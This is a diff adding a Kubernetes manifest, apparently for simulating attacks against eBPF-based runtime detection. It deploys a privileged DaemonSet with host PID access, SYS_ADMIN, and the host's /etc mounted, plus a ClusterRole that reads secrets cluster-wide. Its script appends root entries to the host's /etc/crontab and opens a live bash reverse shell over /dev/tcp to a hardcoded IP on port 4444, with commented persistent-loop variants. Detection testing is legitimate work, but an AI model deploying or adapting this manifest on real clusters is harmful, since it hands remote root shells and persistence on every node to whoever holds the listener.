@@ -1,0 +1,132 @@
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: ebpf-attacker
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: ebpf-attacker-sa
+  namespace: ebpf-attacker
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: ebpf-attacker-role
+rules:
+  - apiGroups: [""]
+    resources: ["namespaces", "pods", "serviceaccounts", "secrets", "configmaps"]
+    verbs: ["list", "get"]
+  - apiGroups: ["rbac.authorization.k8s.io"]
+    resources: ["rolebindings", "clusterrolebindings"]
+    verbs: ["list", "get"]
+  - apiGroups: ["networking.k8s.io"]
+    resources: ["networkpolicies", "ingresses"]
+    verbs: ["list", "get"]
+  - apiGroups: ["policy"]
+    resources: ["podsecuritypolicies"]
+    verbs: ["list", "get"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: ebpf-attacker-role-binding
+subjects:
+- kind: ServiceAccount
+  name: ebpf-attacker-sa
+  namespace: ebpf-attacker
+roleRef:
+  kind: ClusterRole
+  name: ebpf-attacker-role
+  apiGroup: rbac.authorization.k8s.io
+
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: attack-script-config
+  namespace: ebpf-attacker
+data:
+  attack-simulation.sh: |
+    #!/bin/bash
+    echo "Running attack script..."
+
+    # Example 1: Check AWS identity
+    echo "Running AWS STS get-caller-identity..."
+    aws sts get-caller-identity
+
+    # Example 2: Add entries to /etc/crontab
+    CRON_ENTRY="* * * * * root echo 'Pentest example entry' >> /tmp/pentest-log"
+    for i in {1..10}; do
+        echo "$CRON_ENTRY" >> /etc/crontab
+        echo "Added entry to /etc/crontab (Iteration $i)"
+        sleep 3
+    done
+
+    # Example 3: Reverse Shell
+    ATTACKER_IP="172.24.0.163"
+    PORT="4444"
+
+    # nohup bash -c "while true; do bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1; sleep 10; done" &
+    # nohup bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
+    bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1
+
+
+---
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: attack-simulation-daemonset
+  namespace: ebpf-attacker
+spec:
+  selector:
+    matchLabels:
+      app: attack-simulation
+  template:
+    metadata:
+      labels:
+        app: attack-simulation
+    spec:
+      serviceAccountName: ebpf-attacker-sa
+      hostPID: true                      # Access to host PID namespace
+      containers:
+      - name: attack-sim
+        image: rsulkowski/attacker-script:latest
+        command: ["/bin/bash", "-c"]
+        #args: ["/opt/scripts/attack-simulation.sh"]
+        args: 
+          - |
+            cp /opt/scripts/attack-simulation.sh /tmp/ && \
+            chmod +x /tmp/attack-simulation.sh && \
+            /tmp/attack-simulation.sh
+        securityContext:
+          runAsUser: 0
+          runAsGroup: 0
+          allowPrivilegeEscalation: true
+          privileged: true               # Enable privileged mode
+          capabilities:
+            add:
+              - NET_ADMIN                # Networking capabilities
+              - SYS_PTRACE               # Required for process tracing
+              - SYS_ADMIN                # Administrative privileges
+        volumeMounts:
+        - name: etc-crontab
+          mountPath: /etc
+        - name: script-volume
+          mountPath: /opt/scripts
+      volumes:
+      - name: etc-crontab
+        hostPath:
+          path: /etc                     # Mount host /etc for crontab modifications
+          type: Directory
+      - name: script-volume
+        configMap:
+          name: attack-script-config
+          items:
+          - key: attack-simulation.sh
+            path: attack-simulation.sh
+
+
